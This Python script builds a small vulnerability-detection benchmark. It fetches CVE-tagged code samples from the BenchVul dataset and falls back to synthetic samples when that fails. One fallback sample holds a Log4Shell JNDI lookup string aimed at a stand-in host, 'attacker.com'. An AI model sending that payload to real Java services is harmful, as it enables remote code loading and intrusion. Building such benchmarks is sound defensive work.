#!/usr/bin/env python3
"""
从 HuggingFace 的 BenchVul 数据集抓取样本，生成 bench_samples.json
"""
import json
from datasets import load_dataset

def main():
    try:
        # 加载 BenchVul 数据集（可能需要下载）
        dataset = load_dataset("yikun-li/BenchVul", split="train", streaming=True)
        samples = []
        count = 0
        for sample in dataset:
            # 提取所需字段：CVE编号、代码片段、标签
            cve = sample.get("CVE", "")
            if not cve:
                continue
            # 只取前5个包含CVE的样本
            samples.append({
                "CVE": cve,
                "code": sample.get("code", ""),
                "label": sample.get("label", ""),  # 官方标签
                "language": sample.get("language", ""),
                "dataset": "BenchVul"
            })
            count += 1
            if count >= 5:
                break
        # 如果没有取到数据，使用备用样本
        if not samples:
            print("无法从数据集获取样本，使用备用样本")
            samples = [
                {
                    "CVE": "CVE-2021-44228",
                    "code": "// Log4j 漏洞示例\nlog.info(\"${jndi:ldap://attacker.com/a}\");",
                    "label": "vulnerable",
                    "language": "java",
                    "dataset": "synthetic"
                },
                {
                    "CVE": "CVE-2021-34527",
                    "code": "// PrintNightmare 漏洞示例\n// 代码省略",
                    "label": "vulnerable",
                    "language": "c",
                    "dataset": "synthetic"
                },
                {
                    "CVE": "CVE-2017-5638",
                    "code": "// Apache Struts 漏洞示例\n// 代码省略",
                    "label": "vulnerable",
                    "language": "java",
                    "dataset": "synthetic"
                }
            ]
        # 保存到文件
        output_path = "src/benchmark/bench_samples.json"
        import os
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(samples, f, indent=2, ensure_ascii=False)
        print(f"已保存 {len(samples)} 个样本到 {output_path}")
        print(json.dumps(samples, indent=2, ensure_ascii=False))
    except Exception as e:
        print(f"抓取样本时出错: {e}")
        import traceback
        traceback.print_exc()
        # 创建备用文件
        import os
        os.makedirs("src/benchmark", exist_ok=True)
        samples = [
            {
                "CVE": "CVE-2021-44228",
                "code": "// Log4j 漏洞示例\nlog.info(\"${jndi:ldap://attacker.com/a}\");",
                "label": "vulnerable",
                "language": "java",
                "dataset": "synthetic"
            },
            {
                "CVE": "CVE-2021-34527",
                "code": "// PrintNightmare 漏洞示例\n// 代码省略",
                "label": "vulnerable",
                "language": "c",
                "dataset": "synthetic"
            },
            {
                "CVE": "CVE-2017-5638",
                "code": "// Apache Struts 漏洞示例\n// 代码省略",
                "label": "vulnerable",
                "language": "java",
                "dataset": "synthetic"
            }
        ]
        with open("src/benchmark/bench_samples.json", "w", encoding="utf-8") as f:
            json.dump(samples, f, indent=2, ensure_ascii=False)
        print("已创建备用样本文件")

if __name__ == "__main__":
    main()